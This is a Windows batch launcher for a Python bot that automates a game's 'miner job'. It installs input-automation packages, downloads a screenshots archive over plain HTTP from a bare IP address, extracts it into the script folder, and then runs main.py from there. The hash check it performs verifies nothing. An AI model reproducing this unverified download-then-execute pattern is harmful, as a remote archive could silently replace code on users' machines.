@echo off
setlocal
echo CODED BY One-Codes
echo CODED BY One-Codes
echo CODED BY One-Codes
echo CODED BY One-Codes
echo CODED BY One-Codes
echo CODED BY One-Codes



set "screenshots_folder=%~dp0"
set "images_found=0"
set "download_url=http://185.80.128.215/screenshots.zip"
set "zip_file=%screenshots_folder%screenshots.zip"

:: Check for Python and pip
python --version >nul 2>&1
if %errorlevel% neq 0 (
    echo Python is not installed or not found in your PATH.
    echo Please install Python from https://www.python.org/ and ensure it is added to your PATH.
    pause
    exit /b
)

pip --version >nul 2>&1
if %errorlevel% neq 0 (
    echo pip is not installed or not found in your PATH.
    echo Please ensure Python installation is correct and pip is added to your PATH.
    pause
    exit /b
)

:: Install required Python packages
pip install pyautogui pydirectinput keyboard opencv-python
pip install Pillow --upgrade
pip install pyscreeze --upgrade
pip install pyautogui --upgrade

REM Check for screenshots.
for %%i in (1.png 2.png 3.png 4.png 5.png 6.png 7.png 8.png 9.png) do (
    if exist "%screenshots_folder%%%i" (
        set "images_found=1"
        goto imagesFound
    )
)
pause

REM If no images were found, download and extract them.
if "%images_found%"=="0" (
    echo Screenshots not found. Attempting to download...
    curl "%download_url%" -o "%zip_file%"
    if %errorlevel% neq 0 (
        echo Failed to download screenshots. Please check your internet connection.
        goto runMain2
    )

    REM Verify the ZIP file is valid.
    powershell -command "& {if ((Get-FileHash '%zip_file%').Hash -eq $null) {exit 1}}"
    if %errorlevel% neq 0 (
        echo The downloaded ZIP file is corrupt or invalid.
        goto runMain2
    )

    REM Extract the ZIP file.
    powershell -command "Expand-Archive -LiteralPath '%zip_file%' -DestinationPath '%screenshots_folder%'"
    if %errorlevel% neq 0 (
        echo Failed to extract screenshots.
        goto runMain2
    )

    del "%zip_file%"
)

:imagesFound
REM Run main.py if images were found or successfully downloaded and extracted.
echo Go to miner job and have fun mining away everything!!!
echo To stop it to [CTRL+C] to start open the file again!
echo Dont use any shaders or anything that makes your screen go weird
echo If you do wanna use shaders please run main2.py and get all the numbers PNG'S
echo The script is currently started DONT CLOSE THIS!!!
echo The script is currently started DONT CLOSE THIS!!!
python "%screenshots_folder%main.py"
if %errorlevel% neq 0 pause
goto end

:runMain2
REM Run main2.py if the download or extraction failed, or ask the user to manually check.
echo Please go to the miner job, check if you pressed 1-9, and got all the PNGs.
echo The script is currently started...
python "%screenshots_folder%main2.py"
if %errorlevel% neq 0 pause
goto end

endlocal
